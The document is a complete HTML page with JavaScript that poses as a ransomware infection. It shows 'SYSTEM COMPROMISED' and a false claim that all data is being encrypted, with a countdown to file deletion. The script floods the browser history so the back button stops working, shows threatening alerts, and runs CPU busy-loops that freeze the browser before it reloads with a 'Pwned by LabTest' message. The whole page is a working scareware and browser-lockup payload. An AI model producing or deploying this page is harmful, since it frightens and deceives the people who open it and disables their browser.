<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>YOU HAVE BEEN HACKED</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; user-select: none; -webkit-user-select: none; }
        .container { text-align: center; width: 90%; z-index: 2; }
        .glitch { font-size: 30px; font-weight: bold; color: #f00; text-transform: uppercase; animation: glitch 0.1s infinite; text-shadow: 2px 2px #ff00f0; }
        .matrix-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; color: #004400; font-size: 10px; overflow: hidden; z-index: 1; opacity: 0.5; }
        .warning-box { border: 2px solid #f00; padding: 20px; background: rgba(255,0,0,0.1); box-shadow: 0 0 20px #f00; margin-top: 20px; }
        .timer { font-size: 40px; color: #fff; margin-top: 10px; }
        @keyframes glitch { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-2px, -2px); } 100% { transform: translate(2px, -2px); } }
    </style>
</head>
<body>
    <div class="matrix-bg" id="matrix"></div>
    
    <div class="container">
        <div class="glitch">SYSTEM COMPROMISED</div>
        <div class="warning-box">
            <p style="color: #fff; font-size: 18px;">ALL YOUR DATA IS BEING ENCRYPTED</p>
            <p>Do not close this window or restart your device.</p>
            <p>Files deleting in:</p>
            <div class="timer" id="timer">15</div>
        </div>
    </div>

    <script>
        // สร้างเอฟเฟกต์ Matrix ตัวอักษรไหล
        const matrixEl = document.getElementById('matrix');
        const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZｦｱｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄ';
        let matrixText = '';
        for(let i=0; i<2000; i++) { matrixText += chars.charAt(Math.floor(Math.random() * chars.length)); }
        matrixEl.innerText = matrixText;
        setInterval(() => {
            matrixEl.innerText = matrixEl.innerText.substring(1) + chars.charAt(Math.floor(Math.random() * chars.length));
        }, 50);

        window.onload = function() {
            // ล็อคปุ่มย้อนกลับ
            for(let i=0; i<100; i++) { history.pushState(null, null, window.location.href); }

            // แสดง alert ขู่
            setTimeout(() => {
                alert("FINAL WARNING: DO NOT EXIT");
                
                // เริ่ม DoS ล็อคเครื่อง
                let timeLeft = 15;
                const timerEl = document.getElementById('timer');
                
                const stressInterval = setInterval(() => {
                    // ทำเครื่องค้างรัวๆ
                    const targetTime = Date.now() + 900; 
                    while (Date.now() < targetTime) { Math.sqrt(Math.random() * 1000000); }
                    
                    timeLeft--;
                    timerEl.innerText = timeLeft;

                    if (timeLeft <= 0) {
                        clearInterval(stressInterval);
                        timerEl.innerText = "0";
                        alert("Pwned by LabTest. Device Resumed.");
                        window.location.reload(); // รีโหลดหน้าเว็บเพื่อให้เครื่องหายค้าง
                    }
                }, 1000); // ทำงานทุกๆ 1 วินาที
                
            }, 1000);
        };
    </script>
</body>
</html>
